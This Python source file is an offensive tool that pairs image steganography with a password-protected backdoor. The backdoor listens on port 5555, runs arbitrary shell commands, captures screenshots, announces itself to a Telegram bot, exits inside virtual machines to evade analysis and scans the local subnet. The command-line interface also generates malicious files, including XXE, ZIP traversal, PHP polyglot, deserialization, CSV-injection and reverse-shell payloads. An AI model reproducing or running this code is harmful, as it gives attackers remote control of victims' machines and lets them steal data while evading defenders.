import argparse
import os
import sys
import zlib
import random
import hashlib
import base64
import logging
import socket
import subprocess
import threading
import time
import requests
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import numpy as np
import cv2
from skimage.metrics import structural_similarity as ssim
import string
import platform
from PIL import ImageGrab
import io

sys.path.append(os.path.dirname(__file__))
import badfiles_generator

# --- Configuration ---
BACKDOOR_PORT = 5555
SCAN_SUBNET = "192.168.1."

# --- Security Configuration ---
TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID")

# --- Setup ---
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# --- Cryptography & Data Manipulation ---

def generate_key(method='fernet'):
    if method == 'fernet':
        return Fernet.generate_key()
    elif method == 'aes':
        return os.urandom(32)
    raise ValueError("Unsupported encryption method")

def encrypt_data(data, key, method='fernet'):
    if method == 'fernet':
        return Fernet(key).encrypt(data)
    elif method == 'aes':
        iv = os.urandom(16)
        padder = padding.PKCS7(128).padder()
        padded_data = padder.update(data) + padder.finalize()
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
        encryptor = cipher.encryptor()
        return iv + encryptor.update(padded_data) + encryptor.finalize()
    raise ValueError("Unsupported encryption method")

def decrypt_data(encrypted_data, key, method='fernet'):
    if method == 'fernet':
        return Fernet(key).decrypt(encrypted_data)
    elif method == 'aes':
        iv = encrypted_data[:16]
        encrypted = encrypted_data[16:]
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
        decryptor = cipher.decryptor()
        decrypted_padded = decryptor.update(encrypted) + decryptor.finalize()
        unpadder = padding.PKCS7(128).unpadder()
        return unpadder.update(decrypted_padded) + unpadder.finalize()
    raise ValueError("Unsupported encryption method")

def compress_data(data, level=9):
    return zlib.compress(data, level)

def decompress_data(compressed_data):
    return zlib.decompress(compressed_data)

def bits_to_bytes(bits):
    return bytes(int(bits[i:i+8], 2) for i in range(0, len(bits), 8))

# --- Payload Generation ---

class AdvancedMorphingPayloadGenerator:
    def __init__(self, payload_length=100, junk_ratio=0.2):
        self.payload = self.generate_random_string(payload_length).encode()
        self.junk_ratio = junk_ratio

    @staticmethod
    def generate_random_string(length):
        characters = string.ascii_letters + string.digits
        return ''.join(random.choice(characters) for _ in range(length))

    def insert_junk(self, data):
        junk_length = int(len(data) * self.junk_ratio)
        junk_bytes = os.urandom(junk_length)
        data_list = list(data)
        for jb in junk_bytes:
            pos = random.randint(0, len(data_list))
            data_list.insert(pos, jb)
        return bytes(data_list)

    def generate_payload(self):
        return self.insert_junk(self.payload)

# --- Steganography Core ---

def calculate_capacity(image, bits_per_channel=1):
    height, width, channels = image.shape
    return (height * width * channels * bits_per_channel) // 8

def get_edge_map(image, threshold=100):
    gray = cv2.cvtColor(image, cv2.COLOR_RGB2GRAY)
    return cv2.Canny(gray, threshold, threshold * 2)

def generate_pixel_order(image_shape, seed=None):
    height, width = image_shape[:2]
    pixels = [(y, x) for y in range(height) for x in range(width)]
    if seed:
        random.seed(seed)
        random.shuffle(pixels)
    return pixels

def embed_lsb(image, data_bits, bits_per_channel, adaptive, seed):
    height, width, channels = image.shape
    if adaptive:
        edge_map = get_edge_map(image)
        pixel_order = [(y, x) for y in range(height) for x in range(width) if edge_map[y, x] > 0]
        if not pixel_order:
            raise ValueError("No edges detected for adaptive embedding")
    else:
        pixel_order = generate_pixel_order(image.shape, seed)

    bit_index = 0
    for y, x in pixel_order:
        for c in range(channels):
            pixel_value = image[y, x, c]
            for b in range(bits_per_channel):
                if bit_index < len(data_bits):
                    bit = int(data_bits[bit_index])
                    pixel_value = (pixel_value & ~(1 << b)) | (bit << b)
                    bit_index += 1
            image[y, x, c] = pixel_value
        if bit_index >= len(data_bits):
            break
    if bit_index < len(data_bits):
        raise ValueError("Image capacity insufficient for payload")
    return image

def extract_lsb(image, payload_size, bits_per_channel, adaptive, seed):
    height, width, channels = image.shape
    if adaptive:
        edge_map = get_edge_map(image)
        pixel_order = [(y, x) for y in range(height) for x in range(width) if edge_map[y, x] > 0]
    else:
        pixel_order = generate_pixel_order(image.shape, seed)

    data_bits = []
    extracted_bytes = 0
    for y, x in pixel_order:
        for c in range(channels):
            pixel_value = image[y, x, c]
            for b in range(bits_per_channel):
                bit = (pixel_value >> b) & 1
                data_bits.append(str(bit))
                if len(data_bits) % 8 == 0:
                    extracted_bytes += 1
                if extracted_bytes >= payload_size:
                    return ''.join(data_bits)
    return ''.join(data_bits)

def compute_psnr(original, stego):
    mse = np.mean((original.astype(float) - stego.astype(float)) ** 2)
    if mse == 0:
        return float('inf')
    return 20 * np.log10(255.0 / np.sqrt(mse))

def compute_ssim(original, stego):
    return ssim(original, stego, multichannel=True)

def encode_image(input_path, payload, output_path, bits, encrypt, encrypt_method, key, compress, adaptive, seed, is_file, verbose):
    try:
        image = cv2.imread(input_path, cv2.IMREAD_UNCHANGED)
        if image is None: raise ValueError("Invalid image file")
        original_image = image.copy()

        data = payload
        if is_file:
            with open(payload, 'rb') as f:
                data = f.read()
        elif isinstance(payload, str):
            data = payload.encode('utf-8')

        if compress:
            data = compress_data(data)

        if encrypt:
            if not key:
                key = generate_key(encrypt_method)
                key_str = base64.urlsafe_b64encode(key).decode('utf-8')
                print(f"Generated key (save this!): {key_str}")
            else:
                key = base64.urlsafe_b64decode(key)
            data = encrypt_data(data, key, encrypt_method)

        data_hash = hashlib.sha256(data).digest()
        full_data = len(data).to_bytes(4, 'big') + data_hash + data

        capacity = calculate_capacity(image, bits)
        if len(full_data) > capacity:
            raise ValueError(f"Payload too large")

        data_bits = ''.join(format(byte, '08b') for byte in full_data)
        stego_image = embed_lsb(image, data_bits, bits, adaptive, seed)
        cv2.imwrite(output_path, stego_image)

        if verbose:
            psnr = compute_psnr(original_image, stego_image)
            ssim_val = compute_ssim(original_image, stego_image)
            print(f"PSNR: {psnr:.2f} dB | SSIM: {ssim_val:.4f}")

    except Exception as e:
        print(f"Encoding error: {str(e)}", file=sys.stderr)
        sys.exit(1)

def decode_image(input_path, key, encrypt_method, compress, bits, adaptive, seed):
    try:
        image = cv2.imread(input_path, cv2.IMREAD_UNCHANGED)
        if image is None:
            raise ValueError("Invalid image file")

        capacity = calculate_capacity(image, bits)
        data_bits = extract_lsb(image, capacity, bits, adaptive, seed)
        full_data = bits_to_bytes(data_bits)

        length = int.from_bytes(full_data[:4], 'big')
        data_hash = full_data[4:36]
        data = full_data[36:36+length]

        if hashlib.sha256(data).digest() != data_hash:
            raise ValueError("Integrity check failed")

        if key:
            key = base64.urlsafe_b64decode(key)
            data = decrypt_data(data, key, encrypt_method)

        if compress:
            data = decompress_data(data)

        return data
    except Exception as e:
        print(f"Decoding error: {str(e)}", file=sys.stderr)
        return None

# --- Backdoor & Ancillary Functions ---

def send_to_telegram(message):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": message}
    try:
        requests.post(url, json=payload, timeout=10)
    except Exception:
        pass

def capture_screenshot():
    img = ImageGrab.grab()
    buf = io.BytesIO()
    img.save(buf, format='PNG')
    return buf.getvalue()

def is_virtual_machine():
    vm_indicators = ["virtual", "vmware", "qemu", "xen"]
    return any(indicator in platform.platform().lower() for indicator in vm_indicators)

def handle_client(client_socket, backdoor_password):
    try:
        encryptor = Fernet(base64.urlsafe_b64encode(hashlib.sha256(backdoor_password.encode()).digest()))
        client_socket.send(b"Password: ")
        encrypted_password = client_socket.recv(1024)
        password = encryptor.decrypt(encrypted_password).decode().strip()
        if password != backdoor_password:
            client_socket.send(encryptor.encrypt(b"Authentication failed.\n"))
            return

        client_socket.send(encryptor.encrypt(b"Authenticated. Enter commands:\n"))
        while True:
            encrypted_command = client_socket.recv(4096)
            if not encrypted_command: break
            command = encryptor.decrypt(encrypted_command).decode().strip()

            if command == "exit":
                break
            elif command == "screenshot":
                img_data = capture_screenshot()
                encrypted_img_data = encryptor.encrypt(img_data)
                client_socket.send(len(encrypted_img_data).to_bytes(4, 'big'))
                client_socket.send(encrypted_img_data)
            else:
                output = subprocess.getoutput(command)
                encrypted_output = encryptor.encrypt(output.encode() + b"\n")
                client_socket.send(encrypted_output)
    except Exception as e:
        logging.error(f"Error handling client: {e}")
    finally:
        client_socket.close()

def start_backdoor_server(backdoor_password):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("0.0.0.0", BACKDOOR_PORT))
    server.listen(5)
    send_to_telegram(f"Backdoor activated on {socket.gethostname()}")
    while True:
        client, addr = server.accept()
        client_handler = threading.Thread(target=handle_client, args=(client, backdoor_password))
        client_handler.start()

def scan_subnet(subnet, port):
    live_hosts = []
    for i in range(1, 255):
        ip = f"{subnet}{i}"
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(0.5)
                if s.connect_ex((ip, port)) == 0:
                    live_hosts.append(ip)
        except Exception:
            pass
    logging.info(f"Live hosts with open port {port}: {live_hosts}")
    return live_hosts

def activate_backdoor(backdoor_password, subnet):
    logging.info("Activating non-persistent backdoor...")
    backdoor_thread = threading.Thread(target=start_backdoor_server, args=(backdoor_password,), daemon=True)
    backdoor_thread.start()

    scan_thread = threading.Thread(target=scan_subnet, args=(subnet, BACKDOOR_PORT), daemon=True)
    scan_thread.start()
    logging.info("Backdoor running in the background. Main thread will now enter a wait state.")
    try:
        while True: time.sleep(3600)
    except KeyboardInterrupt:
        sys.exit(0)

# --- Main CLI ---

def main():
    if is_virtual_machine():
        logging.info("Virtual machine detected. Exiting.")
        return

    parser = argparse.ArgumentParser(description="A versatile steganography tool with backdoor capabilities.")
    subparsers = parser.add_subparsers(dest="command", required=True)

    # --- Encode Parser ---
    encode_parser = subparsers.add_parser("encode", help="Embed a payload into an image.")
    encode_parser.add_argument("input_image", help="Path to the input image.")
    encode_parser.add_argument("output_image", help="Path to save the output stego image.")
    encode_parser.add_argument("payload", nargs='?', help="Payload string or file path.")
    encode_parser.add_argument("--file", action="store_true", help="Treat payload as a file path.")
    encode_parser.add_argument("--generate-payload", action="store_true", help="Generate a random payload.")
    encode_parser.add_argument("--bits", type=int, default=1, choices=range(1, 5))
    encode_parser.add_argument("--compress", action="store_true")
    encode_parser.add_argument("--encrypt", action="store_true")
    encode_parser.add_argument("--encrypt-method", default="fernet", choices=["fernet", "aes"])
    encode_parser.add_argument("--key")
    encode_parser.add_argument("--adaptive", action="store_true")
    encode_parser.add_argument("--seed")
    encode_parser.add_argument("-v", "--verbose", action="store_true")

    # --- Decode Parser ---
    decode_parser = subparsers.add_parser("decode", help="Extract a payload from an image.")
    decode_parser.add_argument("input_image")

    # --- Generate Parser ---
    generate_parser = subparsers.add_parser("generate", help="Generate a malicious file.")
    generate_subparsers = generate_parser.add_subparsers(dest="file_type", required=True)

    # XML Generator
    xml_parser = generate_subparsers.add_parser("xml", help="Generate a malicious XML file.")
    xml_parser.add_argument("--type", choices=["xxe", "billion_laughs"], required=True, help="Type of XML attack.")
    xml_parser.add_argument("--output", required=True, help="Output file name.")
    xml_parser.add_argument("--file-to-read", default="/etc/passwd", help="File to read for XXE attack.")

    # ZIP Generator
    zip_parser = generate_subparsers.add_parser("zip", help="Generate a malicious ZIP file.")
    zip_parser.add_argument("--type", choices=["traversal"], required=True, help="Type of ZIP attack.")
    zip_parser.add_argument("--output", required=True, help="Output file name.")
    zip_parser.add_argument("--target-path", default="../../../../../../../../../etc/passwd", help="Target path for traversal.")
    zip_parser.add_argument("--content", default="hacked", help="Content of the malicious file.")

    # PNG Generator
    png_parser = generate_subparsers.add_parser("png", help="Generate a malicious PNG file.")
    png_parser.add_argument("--type", choices=["bad_ihdr"], required=True, help="Type of PNG attack.")
    png_parser.add_argument("--output", required=True, help="Output file name.")
    png_parser.add_argument("--width", type=int, default=1, help="Width of the image.")
    png_parser.add_argument("--height", type=int, default=1, help="Height of the image.")

    # Upload Generator
    upload_parser = generate_subparsers.add_parser("upload", help="Generate a malicious file for upload.")
    upload_parser.add_argument("--type", choices=["null_byte", "polyglot_jpeg_php"], required=True, help="Type of upload attack.")
    upload_parser.add_argument("--output", required=True, help="Output file name.")
    upload_parser.add_argument("--base-name", default="payload.php", help="Base name for null byte attack.")
    upload_parser.add_argument("--null-byte-ext", default=".jpg", help="Extension for null byte attack.")
    upload_parser.add_argument("--php-code", default="<?php phpinfo(); ?>", help="PHP code for polyglot attack.")

    # Deserialization Generator
    deserialization_parser = generate_subparsers.add_parser("deserialization", help="Generate a deserialization payload.")
    deserialization_parser.add_argument("--type", choices=["php", "python"], required=True, help="Type of deserialization attack.")
    deserialization_parser.add_argument("--output", required=True, help="Output file name for Python pickle, or 'stdout' for PHP.")
    deserialization_parser.add_argument("--class-name", default="BenignClass", help="Class name for PHP deserialization.")
    deserialization_parser.add_argument("--prop-name", default="name", help="Property name for PHP deserialization.")
    deserialization_parser.add_argument("--prop-value", default="test", help="Property value for PHP deserialization.")

    # Document Generators
    doc_parser = generate_subparsers.add_parser("doc", help="Generate a malicious document file.")
    doc_parser.add_argument("--type", choices=["csv_injection", "rtf_linked_object"], required=True, help="Type of document attack.")
    doc_parser.add_argument("--output", required=True, help="Output file name.")
    doc_parser.add_argument("--command", default="=cmd|'/C calc.exe'!A0", help="Command for CSV injection.")
    doc_parser.add_argument("--url", default="http://example.com/logo.gif", help="URL for RTF linked object.")

    # EDR Evasion Generator
    edr_parser = generate_subparsers.add_parser("edr", help="Generate a file for EDR testing.")
    edr_parser.add_argument("--type", choices=["reverse_shell"], required=True, help="Type of EDR evasion.")
    edr_parser.add_argument("--output", required=True, help="Output file name.")
    edr_parser.add_argument("--host", default="127.0.0.1", help="Host for reverse shell.")
    edr_parser.add_argument("--port", type=int, default=4444, help="Port for reverse shell.")

    decode_parser.add_argument("--key")
    decode_parser.add_argument("--encrypt-method", default="fernet")
    decode_parser.add_argument("--compress", action="store_true")
    decode_parser.add_argument("--output-file")
    decode_parser.add_argument("--bits", type=int, default=1)
    decode_parser.add_argument("--adaptive", action="store_true")
    decode_parser.add_argument("--seed")
    decode_parser.add_argument("--execute", action="store_true", help="Activate the backdoor if payload is valid.")
    decode_parser.add_argument("--backdoor-password", help="Password for the backdoor shell.")
    decode_parser.add_argument("--subnet", default="192.168.1.")

    args = parser.parse_args()

    if "verbose" in args and args.verbose:
        logging.getLogger().setLevel(logging.INFO)

    if args.command == "encode":
        payload = args.payload
        is_file = args.file
        if args.generate_payload:
            if payload: logging.warning("Payload argument ignored due to --generate-payload.")
            payload = AdvancedMorphingPayloadGenerator().generate_payload()
            is_file = False
        elif not payload:
            parser.error("A payload string or file path is required if --generate-payload is not used.")

        encode_image(args.input_image, payload, args.output_image, args.bits, args.encrypt, args.encrypt_method, args.key, args.compress, args.adaptive, args.seed, is_file, args.verbose)

    elif args.command == "decode":
        extracted_data = decode_image(args.input_image, args.key, args.encrypt_method, args.compress, args.bits, args.adaptive, args.seed)
        if extracted_data is None:
            sys.exit(1)

        if args.execute:
            if not args.backdoor_password:
                parser.error("The --backdoor-password argument is required when using --execute.")
            activate_backdoor(args.backdoor_password, args.subnet)
        elif args.output_file:
            with open(args.output_file, 'wb') as f:
                f.write(extracted_data)
        else:
            try:
                print("Extracted Text:", extracted_data.decode('utf-8'))
            except UnicodeDecodeError:
                print("Extracted Binary Data (use --output-file to save):")
                print(base64.b64encode(extracted_data).decode('utf-8'))

    elif args.command == "generate":
        if args.file_type == "xml":
            if args.type == "xxe":
                content = badfiles_generator.generate_xxe_xml(args.file_to_read)
                with open(args.output, "w") as f:
                    f.write(content)
                logging.info(f"Generated XXE XML file: {args.output}")
            elif args.type == "billion_laughs":
                content = badfiles_generator.generate_billion_laughs_xml()
                with open(args.output, "w") as f:
                    f.write(content)
                logging.info(f"Generated Billion Laughs XML file: {args.output}")
        elif args.file_type == "zip":
            if args.type == "traversal":
                badfiles_generator.generate_zip_traversal(args.output, args.target_path, args.content)
        elif args.file_type == "png":
            if args.type == "bad_ihdr":
                badfiles_generator.generate_bad_png(args.output, args.width, args.height)
        elif args.file_type == "upload":
            if args.type == "null_byte":
                badfiles_generator.generate_null_byte_filename_concept(args.output, args.base_name, args.null_byte_ext)
            elif args.type == "polyglot_jpeg_php":
                badfiles_generator.generate_polyglot_jpeg_php(args.output, args.php_code)
        elif args.file_type == "deserialization":
            if args.type == "php":
                content = badfiles_generator.generate_php_deserialization_concept(args.class_name, args.prop_name, args.prop_value)
                if args.output == "stdout":
                    print(content)
                else:
                    with open(args.output, "w") as f:
                        f.write(content)
                    logging.info(f"Generated PHP deserialization payload to: {args.output}")
            elif args.type == "python":
                badfiles_generator.generate_python_pickle_concept(args.output)
        elif args.file_type == "doc":
            if args.type == "csv_injection":
                badfiles_generator.generate_csv_injection(args.output, args.command)
            elif args.type == "rtf_linked_object":
                badfiles_generator.generate_rtf_linked_object(args.output, args.url)
        elif args.file_type == "edr":
            if args.type == "reverse_shell":
                badfiles_generator.generate_python_reverse_shell(args.output, args.host, args.port)

if __name__ == "__main__":
    main()